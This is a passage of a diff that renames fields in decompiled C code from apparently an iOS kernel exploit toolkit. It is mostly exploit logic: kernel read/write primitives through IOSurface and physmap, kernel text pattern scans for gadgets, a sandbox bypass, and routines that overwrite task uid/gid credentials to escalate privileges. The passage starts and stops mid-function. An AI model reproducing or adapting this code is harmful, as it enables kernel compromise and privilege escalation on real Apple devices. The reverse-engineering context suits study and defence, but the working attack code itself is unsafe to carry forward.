+  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
   {
     v6 = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", v6);
   }
-  else if ( (unsigned int)(krwCtx->gap_0xE8 + 1) >= 2 && krwCtx->gap_0xF8 && krwCtx->gap_0x100 )
+  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
   {
     v6 = ioconnect_callmethod_write(krwCtx, a2, (__int64)a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=ioconnect raw=%x\n", v6);
@@ -29835,7 +29835,7 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
     if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
     {
 LABEL_22:
-      v7 = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->gap_0x178_size4);
+      v7 = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->vmMapSize_size4);
       TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", v7, v7 == 0);
       return v7 == 0;
     }
@@ -30130,7 +30130,7 @@ __int64 __fastcall necp_socket_fileport_setup(struct_krwCtx *krwCtx)
   __int64 v16; // [xsp+20h] [xbp-30h] BYREF
   mach_port_t v17; // [xsp+2Ch] [xbp-24h]
 
-  v1 = krwCtx->gap_0x28;
+  v1 = krwCtx->semaphoreHelperCtx;
   if ( !v1 )
     return 0;
   v17 = 0;
@@ -30593,14 +30593,14 @@ __int64 __fastcall necp_ioservice_auth_write(struct_krwCtx *krwCtx, __int64 a2)
   unsigned int v13; // w8
   __int64 v15; // [xsp+8h] [xbp-38h] BYREF
 
-  v4 = krwCtx->gap_0x10;
+  v4 = krwCtx->iosurfaceObj;
   if ( v4 + 1 <= 1 )
   {
     v5 = (unsigned int)ioservice_get_matching("AppleSEPManager");
     if ( v5 + 1 < 2 )
       return 708625;
     v4 = v5;
-    krwCtx->gap_0x10 = v5;
+    krwCtx->iosurfaceObj = v5;
   }
   v6 = 163856;
   v7 = krwCtx->gap_0x18;
@@ -37119,9 +37119,9 @@ __int64 __fastcall krw_task_for_pid_or_name_ret_x0(struct_krwCtx *krwCtx, __int6
   dataBase = 0;
   dataSize = 0;
   dataEnd = 0;
-  if ( krwCtx->gap_0x19F8 )
+  if ( krwCtx->kernelMachoCtx )
   {
-    macho_walk_segment_by_name("__DATA", krwCtx->gap_0x19F8, &dataSegment);
+    macho_walk_segment_by_name("__DATA", krwCtx->kernelMachoCtx, &dataSegment);
     dataBase = dataSegment.base_ptr;
     if ( !dataBase )
       return 0;
@@ -38511,7 +38511,7 @@ LABEL_17:
       v12 = 2220;
     if ( krwCtx->xnuMajorVersion >= 8019 )
     {
-      v15 = krwCtx->gap_0x19F8;
+      v15 = krwCtx->kernelMachoCtx;
       if ( !v15 )
         return 708625;
       macho_find_text_section(v15, v36);
@@ -38519,7 +38519,7 @@ LABEL_17:
       if ( !v16 )
         return 708625;
       v10 = 708620;
-      v17 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v16 - 8));
+      v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 - 8));
       if ( !v17 )
         return 708625;
       v18 = v17;
@@ -40010,11 +40010,11 @@ __int64 __fastcall map_shared_mem_and_transfer_data(struct_krwCtx *krwCtx, __int
     v12 = pthread_mutex_lock(&krwCtx->someMutex2);
     if ( !v12 )
     {
-      v13 = (uint64_t *)krwCtx->gap_0x370;
+      v13 = (uint64_t *)krwCtx->restoreRecordListHead;
       if ( v13 )
       {
         v14 = 0;
-        v15 = &krwCtx->gap_0x370;
+        v15 = &krwCtx->restoreRecordListHead;
         while ( 1 )
         {
           v16 = v13;
@@ -40179,9 +40179,9 @@ static __int64 cleanup_restore_record_metadata_only(struct_krwCtx *krwCtx, __int
   if ( lock_result )
     return (lock_result < 0 ? -lock_result : lock_result) | 0x40000000u;
 
-  node = (uint64_t *)krwCtx->gap_0x370;
+  node = (uint64_t *)krwCtx->restoreRecordListHead;
   prev = 0;
-  link = &krwCtx->gap_0x370;
+  link = &krwCtx->restoreRecordListHead;
   while ( node )
   {
     if ( node[1] == a2 && *((uint32_t *)node + 6) == (uint32_t)size )
@@ -40397,7 +40397,7 @@ LABEL_90:
         free(v40);
         goto LABEL_29;
       }
-      v51 = (__int64 *)krwCtx->gap_0x370;
+      v51 = (__int64 *)krwCtx->restoreRecordListHead;
       if ( v51 )
       {
         while ( 1 )
@@ -40412,7 +40412,7 @@ LABEL_90:
         pthread_mutex_unlock(&krwCtx->someMutex2);
         goto LABEL_90;
       }
-      v52 = &krwCtx->gap_0x370;
+      v52 = &krwCtx->restoreRecordListHead;
 LABEL_112:
       *v52 = v40;
       if ( pthread_mutex_unlock(&krwCtx->someMutex2) )
@@ -41151,7 +41151,7 @@ unsigned __int64 __fastcall translate_physmap_addr_via_segments(struct_krwCtx *k
     return a2 - a3 + a4;
   if ( !krwCtx->raw_0x1A08[2] && (unsigned int)init_or_get_kread_pattern_table(krwCtx) )
     return 0;
-  v8 = krwCtx->gap_0x18A0;
+  v8 = krwCtx->iogpuObjCount;
   if ( !(uint32_t)v8 )
     return a2 - a3 + a4;
   for ( i = &krwCtx->raw_0x1A08[2]; ; i += 3 )
@@ -41180,16 +41180,16 @@ __int64 __fastcall init_or_get_kread_pattern_table(struct_krwCtx *krwCtx)
   __int64 v12; // [xsp+0h] [xbp-40h] BYREF
   __int64 record[3]; // [xsp+8h] [xbp-38h] BYREF
 
-  v2 = krwCtx->gap_0x1898;
+  v2 = krwCtx->iogpuKobjPtr2;
   if ( v2 )
   {
-    if ( !krwCtx->gap_0x18A0 )
+    if ( !krwCtx->iogpuObjCount )
       return 0;
   }
   else
   {
     LODWORD(v12) = 0;
-    v3 = find_kernel_func_versioned(krwCtx->gap_0x19F8, (int *)&v12);
+    v3 = find_kernel_func_versioned(krwCtx->kernelMachoCtx, (int *)&v12);
     v4 = v12;
     if ( v3 )
       v5 = (uint32_t)v12 == 0;
@@ -41198,8 +41198,8 @@ __int64 __fastcall init_or_get_kread_pattern_table(struct_krwCtx *krwCtx)
     if ( v5 )
       return 708625;
     v2 = v3;
-    krwCtx->gap_0x1898 = v3;
-    krwCtx->gap_0x18A0 = v4;
+    krwCtx->iogpuKobjPtr2 = v3;
+    krwCtx->iogpuObjCount = v4;
   }
   v7 = 0;
   v8 = 0;
@@ -41220,7 +41220,7 @@ __int64 __fastcall init_or_get_kread_pattern_table(struct_krwCtx *krwCtx)
     v11[2] = v10;
     ++v8;
     v7 += 24;
-    if ( v8 >= krwCtx->gap_0x18A0 )
+    if ( v8 >= krwCtx->iogpuObjCount )
       return 0;
   }
   return 163855;
@@ -41237,7 +41237,7 @@ unsigned __int64 __fastcall map_physpage_to_user(struct_krwCtx *krwCtx, __int64 
     return a3 - a2 + a4;
   if ( !krwCtx->raw_0x1A08[2] && (unsigned int)init_or_get_kread_pattern_table(krwCtx) )
     return 0;
-  v8 = krwCtx->gap_0x18A0;
+  v8 = krwCtx->iogpuObjCount;
   if ( !(uint32_t)v8 )
     return a3 - a2 + a4;
   for ( i = &krwCtx->raw_0x1A08[2]; ; i += 3 )
@@ -42265,7 +42265,7 @@ __int64 __fastcall init_pgtable_walk_ctx(struct_krwCtx *krwCtx, unsigned __int64
   __int128 v7; // q1
   int v8; // w3
 
-  if ( krwCtx->gap_0x19F8 )
+  if ( krwCtx->kernelMachoCtx )
     return 0;
   v3 = a2;
   if ( !a2 )
@@ -42283,7 +42283,7 @@ __int64 __fastcall init_pgtable_walk_ctx(struct_krwCtx *krwCtx, unsigned __int64
   *(__int128 *)(v6 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
   *(__int128 *)(v6 + 128) = v7;
   *(uint64_t *)(v6 + 144) = krwCtx->gap_0x160_size8;
-  *(uint32_t *)(v6 + 152) = krwCtx->gap_0x178_size4;
+  *(uint32_t *)(v6 + 152) = krwCtx->vmMapSize_size4;
   *(uint32_t *)(v6 + 56) = krwCtx->pageSizeOrSomething;
   if ( krwCtx->xnuVersionPacked >> 43 <= 0x44Au )
     v8 = 128;
@@ -42292,7 +42292,7 @@ __int64 __fastcall init_pgtable_walk_ctx(struct_krwCtx *krwCtx, unsigned __int64
   if ( !iosurface_physmap_setup_alt(v6, 0, v3, v8) )
     return 163863;
   result = 0;
-  krwCtx->gap_0x19F8 = v6;
+  krwCtx->kernelMachoCtx = v6;
   return result;
 }
 
@@ -42338,10 +42338,10 @@ void __usercall resolve_kernel_text_range(SearchObj *x8_0, struct_krwCtx *a2)
       goto LABEL_2;
     if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
     {
-      macho_walk_segment_by_name("__PPLTEXT", a2->gap_0x19F8, &a1);
+      macho_walk_segment_by_name("__PPLTEXT", a2->kernelMachoCtx, &a1);
       goto LABEL_5;
     }
-    macho_find_text_section(a2->gap_0x19F8, &a1.field_0x00);
+    macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
     base_ptr = a1.base_ptr;
     size = a1.size;
     if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
@@ -42356,18 +42356,18 @@ void __usercall resolve_kernel_text_range(SearchObj *x8_0, struct_krwCtx *a2)
     v6 = kernel_pattern_scan(&a1, "08 DC 70 92", 0);
     if ( !v6 )
       goto LABEL_2;
-    v7 = resolve_branch_target((__int64 *)a2->gap_0x19F8, (__int64 *)(v6 - 4));
+    v7 = resolve_branch_target((__int64 *)a2->kernelMachoCtx, (__int64 *)(v6 - 4));
     if ( !v7 )
       goto LABEL_2;
     v8 = (unsigned __int64)v7;
-    macho_find_text_section(a2->gap_0x19F8, &a1.field_0x00);
+    macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
     v9 = a1.base_ptr - v8;
     if ( a1.base_ptr > v8
       || (v10 = a1.size, v8 >= a1.size + a1.base_ptr)
       || (x8_0->field_0x00 = a1.field_0x00, x8_0->base_ptr = v8, v11 = v9 + v10, (x8_0->size = v11) == 0) )
     {
   LABEL_2:
-      macho_find_text_section(a2->gap_0x19F8, &a1.field_0x00);
+      macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
   LABEL_5:
       *x8_0 = a1;
     }
@@ -42391,10 +42391,10 @@ void __usercall resolve_kernel_text_range(SearchObj *x8_0, struct_krwCtx *a2)
 //    goto LABEL_2;
 //  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
 //  {
-//    macho_walk_segment_by_name("__PPLTEXT", &v11, a2->gap_0x19F8);
+//    macho_walk_segment_by_name("__PPLTEXT", &v11, a2->kernelMachoCtx);
 //    goto LABEL_5;
 //  }
-//  macho_find_text_section(a2->gap_0x19F8, &v11);
+//  macho_find_text_section(a2->kernelMachoCtx, &v11);
 //  v4 = v12;
 //  if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
 //  {
@@ -42407,18 +42407,18 @@ void __usercall resolve_kernel_text_range(SearchObj *x8_0, struct_krwCtx *a2)
 //  v5 = kernel_pattern_scan((__int64)&v11, "08 DC 70 92", 0);
 //  if ( !v5 )
 //    goto LABEL_2;
-//  v6 = resolve_branch_target((__int64 *)a2->gap_0x19F8, (__int64 *)(v5 - 4));
+//  v6 = resolve_branch_target((__int64 *)a2->kernelMachoCtx, (__int64 *)(v5 - 4));
 //  if ( !v6 )
 //    goto LABEL_2;
 //  v7 = v6;
-//  macho_find_text_section(a2->gap_0x19F8, &v11);
+//  macho_find_text_section(a2->kernelMachoCtx, &v11);
 //  v8 = *((uint64_t *)&v11 + 1) - (uint64_t)v7;
 //  if ( *((uint64_t *)&v11 + 1) > (unsigned __int64)v7
 //    || (v9 = v12, (unsigned __int64)v7 >= v12 + *((uint64_t *)&v11 + 1))
 //    || (*a1 = v11, a1[1] = v7, v10 = v8 + v9, (a1[2] = v10) == 0) )
 //  {
 //LABEL_2:
-//    macho_find_text_section(a2->gap_0x19F8, &v11);
+//    macho_find_text_section(a2->kernelMachoCtx, &v11);
 //LABEL_5:
 //    *(__int128 *)a1 = v11;
 //    a1[2] = v12;
@@ -42509,10 +42509,10 @@ LABEL_18:
     return result;
   if ( memcmp(__s1, task_info_out, (unsigned int)a5) )
     return 0;
-  if ( !krwCtx->gap_0x1900 && a3 == 2 && mach_task_self_ == target_task )
+  if ( !krwCtx->selfTaskDyldInfoKaddr && a3 == 2 && mach_task_self_ == target_task )
   {
-    krwCtx->gap_0x1908 = *(uint64_t *)task_info_out;
-    krwCtx->gap_0x1900 = v20;
+    krwCtx->selfTaskDyldInfoValue = *(uint64_t *)task_info_out;
+    krwCtx->selfTaskDyldInfoKaddr = v20;
   }
   return kwritebuf_universal(krwCtx, v20, a4, a5);
 }
@@ -42681,10 +42681,10 @@ __int64 __fastcall get_or_set_uid_cred_in_task(struct_krwCtx *krwCtx, int a2, in
     result = krw_read_thunk(krwCtx, result + 104, 4, &v31);
     if ( (uint32_t)result )
     {
-      if ( !krwCtx->gap_0x1910_size4 && !krwCtx->gap_0x1914_size4 )
+      if ( !krwCtx->savedUid && !krwCtx->savedGid )
       {
-        krwCtx->gap_0x1910_size4 = v8;
-        krwCtx->gap_0x1914_size4 = v31;
+        krwCtx->savedUid = v8;
+        krwCtx->savedGid = v31;
       }
       if ( v8 == a2 && v31 == a3 )
         return 1;
@@ -42692,7 +42692,7 @@ __int64 __fastcall get_or_set_uid_cred_in_task(struct_krwCtx *krwCtx, int a2, in
         goto LABEL_10;
       if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) )
         return 0;
-      result = krwCtx->gap_0x18E0_size8;
+      result = krwCtx->cachedSelfTaskKaddr;
       if ( !result )
       {
 LABEL_10:
@@ -42700,9 +42700,9 @@ LABEL_10:
         result = get_kobj_and_resolve_kaddr(krwCtx, mach_task_self_, &selfTaskKaddr);
         if ( !result )
           return result;
-        if ( !krwCtx->gap_0x18E0_size8 )
+        if ( !krwCtx->cachedSelfTaskKaddr )
         {
-          krwCtx->gap_0x18E0_size8 = result;
+          krwCtx->cachedSelfTaskKaddr = result;
           krwCtx->gap_0x18E8 = selfTaskKaddr;
         }
       }
@@ -42759,11 +42759,11 @@ LABEL_10:
                   v14 = krwCtx->gap_0x1990_size8;
                   if ( !v14 )
                   {
-                    macho_find_text_section(krwCtx->gap_0x19F8, v32);
+                    macho_find_text_section(krwCtx->kernelMachoCtx, v32);
                     v16 = kernel_pattern_scan((__int64)v32, "00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52", 0);
                     if ( !v16 )
                       return 0;
-                    v17 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v16 + 4));
+                    v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 + 4));
                     if ( !v17 )
                       return 0;
                     v14 = v17;
@@ -43481,7 +43481,7 @@ LABEL_9:
   else
   {
     map_physpage_to_user(krwCtx, 0, 0, 0);
-    if ( krwCtx->gap_0x18A0 )
+    if ( krwCtx->iogpuObjCount )
     {
       v36 = 0;
       do
@@ -43518,7 +43518,7 @@ LABEL_9:
                     *(__int128 *)(v12 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
                     *(__int128 *)(v12 + 128) = v45;
                     *(uint64_t *)(v12 + 144) = krwCtx->gap_0x160_size8;
-                    *(uint32_t *)(v12 + 152) = krwCtx->gap_0x178_size4;
+                    *(uint32_t *)(v12 + 152) = krwCtx->vmMapSize_size4;
                     *(uint32_t *)(v12 + 56) = krwCtx->pageSizeOrSomething;
                     if ( iosurface_physmap_setup_bool(v12, 0, v42, 0) )
                     {
@@ -43536,7 +43536,7 @@ LABEL_9:
         }
         ++v36;
       }
-      while ( v36 < krwCtx->gap_0x18A0 );
+      while ( v36 < krwCtx->iogpuObjCount );
     }
   }
   return 0;
@@ -43855,7 +43855,7 @@ int set_task_special_port_and_patch_uid(struct_krwCtx *krwCtx, task_inspect_t ta
                 if (!kread64_internal(krwCtx, task_kaddr, &kptr2))
                     return 0;
 
-                uint64_t saved_kptr = krwCtx->gap_0x10;
+                uint64_t saved_kptr = krwCtx->iosurfaceObj;
                 // [sp+0x10] was the first kptr read
                 if (kptr2 != saved_kptr) {
                     if (!kwrite64_dispatch(krwCtx, task_kaddr, saved_kptr))
@@ -44881,7 +44881,7 @@ LABEL_23:
     return mach_port_with_a2;
 LABEL_33:
   if ( xnuMajorVersion >= 7195 )
-    krwCtx->gap_0xB = check_sandboxed(krwCtx->xnuVersionPacked >> 43 > 0x44A);
+    krwCtx->isSandboxed = check_sandboxed(krwCtx->xnuVersionPacked >> 43 > 0x44A);
   if ( !(unsigned int)comm_page_get_cpu_family((uint32_t *)&cpuFamily) )
     return 163858;
   if ( (int)cpuFamily <= 0x2876F5B4 )
@@ -45052,7 +45052,7 @@ LABEL_87:
   if ( v35 != v36 )
     return 0x28012;
 LABEL_96:
-  krwCtx->gap_0x178 = 2 * v34 - 64;
+  krwCtx->vmMapSize = 2 * v34 - 64;
   *(__int128 *)&krwCtx->gap_0x19E8 = xmmword_43730;
   if ( !(unsigned int)another_sandbox_check(krwCtx) )
     return 0x28012;
@@ -45083,7 +45083,7 @@ LABEL_96:
   }
   if ( has_valid_krw_path(krwCtx) )
   {
-    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) && krwCtx->gap_0xB )
+    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) && krwCtx->isSandboxed )
     {
       v95 = 1;
       goto LABEL_172;
@@ -45191,7 +45191,7 @@ LABEL_210:
   if ( !v97 && v94 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
     goto LABEL_210;
 LABEL_211:
-  v52 = krwCtx->gap_0x19F8;
+  v52 = krwCtx->kernelMachoCtx;
   if ( !v52 )
   {
     v58 = (struct_a1 *)calloc(0x128u, 1u);
@@ -45203,11 +45203,11 @@ LABEL_211:
     *(__int128 *)(v52 + 112) = xnuVersion.majorVersion;
     *(__int128 *)(v52 + 128) = v59;
     *(uint64_t *)(v52 + 144) = xnuVersion.qword20;
-    *(uint32_t *)(v52 + 152) = krwCtx->gap_0x178;
+    *(uint32_t *)(v52 + 152) = krwCtx->vmMapSize;
     *(uint32_t *)(v52 + 56) = krwCtx->pageSizeOrSomething;
     if ( !iosurface_physmap_setup_alt(v52, krwCtx->targetAndParentTaskPorts, v44, v42) )
       return 163863;
-    krwCtx->gap_0x19F8 = v52;
+    krwCtx->kernelMachoCtx = v52;
   }
   v53 = *(__int64 (__fastcall **)(struct_krwCtx *))&krwCtx->gap_0x1E0;
   if ( v53 && *(uint64_t *)&krwCtx->gap_0x1E8 )
@@ -45256,7 +45256,7 @@ LABEL_233:
   }
   if ( v61 )
     goto LABEL_259;
-  macho_getsectbyname("__DATA_CONST", krwCtx->gap_0x19F8, "__const", &v104);
+  macho_getsectbyname("__DATA_CONST", krwCtx->kernelMachoCtx, "__const", &v104);
   st_ino = (__int64 *)v104.st_ino;
   if ( !v104.st_ino || !*(uint64_t *)&v104.st_uid || v104.st_ino >= *(uint64_t *)&v104.st_uid + v104.st_ino )
     return 0;
@@ -45302,11 +45302,11 @@ LABEL_260:
       *(__int128 *)(v68 + 112) = xnuVersion.majorVersion;
       *(__int128 *)(v68 + 128) = v69;
       *(uint64_t *)(v68 + 144) = xnuVersion.qword20;
-      *(uint32_t *)(v68 + 152) = krwCtx->gap_0x178;
+      *(uint32_t *)(v68 + 152) = krwCtx->vmMapSize;
       *(uint32_t *)(v68 + 56) = krwCtx->pageSizeOrSomething;
       if ( (unsigned int)alloc_kernel_offset_table(v68, *(uint64_t *)(v52 + 160)) )
       {
-        krwCtx->gap_0x1A00 = v68;
+        krwCtx->auxkcMachoCtx = v68;
         goto LABEL_267;
       }
       return 163863;
@@ -45328,7 +45328,7 @@ LABEL_267:
     v79->xnuMajorVersion = xnuVersion.majorVersion;
     v79->oword80 = v81;
     *(uint64_t *)&v79->oword90 = xnuVersion.qword20;
-    DWORD2(v79->oword90) = krwCtx->gap_0x178;
+    DWORD2(v79->oword90) = krwCtx->vmMapSize;
     DWORD2(v79->oword30) = krwCtx->pageSizeOrSomething;
     if ( v41 > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
     {
@@ -45351,7 +45351,7 @@ LABEL_267:
     v83->xnuMajorVersion = xnuVersion.majorVersion;
     v83->oword80 = v84;
     v83->qword90 = xnuVersion.qword20;
-    v83->dword98 = krwCtx->gap_0x178;
+    v83->dword98 = krwCtx->vmMapSize;
     v83->dword38 = krwCtx->pageSizeOrSomething;
     if ( v41 > XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
     {
@@ -45367,7 +45367,7 @@ LABEL_267:
   v70 = *(uint64_t *)&krwCtx->mappedKernelRegion;
   if ( !v70 || !*(uint64_t *)&krwCtx->mappedKernelSize || (v71 = *(uint64_t *)(v70 + 296), (*(uint64_t *)&v104.st_dev = v71) == 0) )
   {
-    v77 = find_kernel_gadget(krwCtx->gap_0x19F8);
+    v77 = find_kernel_gadget(krwCtx->kernelMachoCtx);
     if ( !v77 )
       return 163866;
     if ( !(unsigned int)krw_read_thunk(krwCtx, (__int64)v77, krwCtx->stride_0x168, &v104) )
@@ -45391,7 +45391,7 @@ LABEL_267:
     || (mach_port_with_a2 = setup_iosurface_semaphore_helper(krwCtx), !(uint32_t)mach_port_with_a2) )
   {
     if ( krwCtx->threadForKernelRead + 1 < 2
-      || !*(uint64_t *)&krwCtx->gap_0xD8
+      || !*(uint64_t *)&krwCtx->threadStateKrwPhysAddr
       || (mach_port_with_a2 = find_map_iosurface_memory(krwCtx), !(uint32_t)mach_port_with_a2) )
     {
       if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8791, 1023, 1023, 1023, 1023) )
@@ -46139,15 +46139,15 @@ __int64 __fastcall reinit_and_refresh_krw_ctx(struct_krwCtx *krwCtx)
 LABEL_11:
   if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) || (unsigned int)setup_sandbox_bypass(krwCtx, 0) )
   {
-    if ( !krwCtx->gap_0x1900
-      || (unsigned int)check_task_dyld_info_versioned(krwCtx, mach_task_self_, 2, &krwCtx->gap_0x1908, 8) )
+    if ( !krwCtx->selfTaskDyldInfoKaddr
+      || (unsigned int)check_task_dyld_info_versioned(krwCtx, mach_task_self_, 2, &krwCtx->selfTaskDyldInfoValue, 8) )
     {
       if ( (v6 = krwCtx->exploitThread, (unsigned int)(v6 + 1) < 2)
         || v6 != mach_thread_self()
         || ((v7 = mach_thread_self(), krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)) ? (v8 = 1) : (v8 = 0x4000000),
             (unsigned int)set_flags_something_INEEDTOLOOK_sub_3F8C0(krwCtx, v7, v8, 0)) )
       {
-        if ( !krwCtx->gap_0x1910_size8 || (unsigned int)get_or_set_uid_cred_in_task(krwCtx, krwCtx->gap_0x1910_size4, krwCtx->gap_0x1914_size4, 0) )
+        if ( !krwCtx->savedUidGid || (unsigned int)get_or_set_uid_cred_in_task(krwCtx, krwCtx->savedUid, krwCtx->savedGid, 0) )
         {
           if ( mach_host_self() == krwCtx->hostSelfPort
             || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_HOST_PORT_READY)
@@ -46244,7 +46244,7 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
       fd_close(v27);
     }
   }
-  if ( krwCtx->gap_0x28 )
+  if ( krwCtx->semaphoreHelperCtx )
     teardown_semaphore_helper_ctx(krwCtx, 1);
   if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
     iogpu_teardown_ctx(krwCtx);
@@ -46280,7 +46280,7 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
   v9 = krwCtx->hostSecurityPort;
   if ( v9 + 1 >= 2 )
     mach_port_deallocate(mach_task_self_, v9);
-  v10 = krwCtx->gap_0x10;
+  v10 = krwCtx->iosurfaceObj;
   if ( v10 + 1 >= 2 )
     IOObjectRelease(v10);
   if ( (unsigned int)(krwCtx->gap_0x18D8_size4 + 1) >= 2 )
@@ -46300,8 +46300,8 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
   }
   if ( !pthread_mutex_lock(&krwCtx->someMutex2) )
   {
-    v14 = (uint32_t *)krwCtx->gap_0x370;
-    krwCtx->gap_0x370 = 0;
+    v14 = (uint32_t *)krwCtx->restoreRecordListHead;
+    krwCtx->restoreRecordListHead = 0;
     if ( v14 )
     {
       do
@@ -46357,19 +46357,19 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
     free((void *)krwCtx->kextMachoCtx2);
     krwCtx->kextMachoCtx2 = 0;
   }
-  v22 = krwCtx->gap_0x1A00;
+  v22 = krwCtx->auxkcMachoCtx;
   if ( v22 )
   {
     free_kernel_image_resources(v22);
-    free((void *)krwCtx->gap_0x1A00);
-    krwCtx->gap_0x1A00 = 0;
+    free((void *)krwCtx->auxkcMachoCtx);
+    krwCtx->auxkcMachoCtx = 0;
   }
-  v23 = (uint64_t)krwCtx->gap_0x19F8;
+  v23 = (uint64_t)krwCtx->kernelMachoCtx;
   if ( v23 )
   {
     free_kernel_image_resources(v23);
-    free(krwCtx->gap_0x19F8);
-    krwCtx->gap_0x19F8 = 0;
+    free(krwCtx->kernelMachoCtx);
+    krwCtx->kernelMachoCtx = 0;
   }
   v24 = (void *)krwCtx->puafPagesBuf;
   if ( v24 )
@@ -46378,11 +46378,11 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
     krwCtx->puafPagesBuf = 0;
     krwCtx->gap_0x1D08_size4 = 0;
   }
-  v25 = krwCtx->gap_0xE8;
+  v25 = krwCtx->ioConnectPort;
   if ( v25 + 1 >= 2 )
   {
     mach_port_deallocate(mach_task_self_, v25);
-    krwCtx->gap_0xE8 = 0;
+    krwCtx->ioConnectPort = 0;
   }
   bzero(krwCtx, 0x1D60u);
   free(krwCtx);
@@ -46563,13 +46563,13 @@ bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2
   }
   if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
   {
-    macho_getsectbyname("__TEXT_EXEC", krwCtx->gap_0x19F8, "__text", sect);
+    macho_getsectbyname("__TEXT_EXEC", krwCtx->kernelMachoCtx, "__text", sect);
     if ( !sect[1] || !sect[2] )
       return false;
     pattern = kernel_pattern_scan((__int64)sect, "08 01 40 39 08 01 00 12", 0);
     if ( !pattern )
       return false;
-    func = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(pattern - 12));
+    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
     if ( !func )
       return false;
     if ( !kread_physmap_decorated(krwCtx, func, (unsigned __int64 *)&v19) )
@@ -46589,11 +46589,11 @@ bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2
     if ( !pattern )
       return false;
     v13 = pattern;
-    func = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(pattern - 16));
+    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 16));
     if ( !func )
       return false;
     v10 = func;
-    func = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v13 - 8));
+    func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v13 - 8));
     if ( !func )
       return false;
     v19 = func;
@@ -46619,17 +46619,17 @@ LABEL_40:
         pattern = kernel_pattern_scan((__int64)sect, "09 FD 9F 08 C0 03 5F D6", 0);
         if ( !pattern )
           return false;
-        func = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(pattern - 12));
+        func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
       }
       else
       {
         pattern = kernel_pattern_scan((__int64)sect, "09 01 00 39 C0 03 5F D6", 0);
         if ( !pattern )
           return false;
-        func = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(pattern - 12));
+        func = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(pattern - 12));
         if ( !func )
           return false;
-        func = macho_read_u64_thunk(krwCtx->gap_0x19F8, func);
+        func = macho_read_u64_thunk(krwCtx->kernelMachoCtx, func);
       }
       v19 = func;
       if ( !func )
@@ -46991,11 +46991,11 @@ unsigned __int64 __fastcall kernel_cstring_pattern_scan(struct_krwCtx *krwCtx, c
   if ( v15 )
   {
 LABEL_22:
-    macho_find_text_section(krwCtx->gap_0x19F8, v24);
+    macho_find_text_section(krwCtx->kernelMachoCtx, v24);
     v18 = kernel_pattern_scan((__int64)v24, v15, 0);
     if ( !v18 )
       goto LABEL_23;
-    v7 = find_kernel_func_aligned(krwCtx->gap_0x19F8, v18 + 8);
+    v7 = find_kernel_func_aligned(krwCtx->kernelMachoCtx, v18 + 8);
     if ( v7 )
     {
       krwCtx->gap_0x19A0 = v7;
@@ -47004,7 +47004,7 @@ LABEL_9:
       v9 = v6 - 1;
       do
       {
-        scan_range[0] = krwCtx->gap_0x19F8;
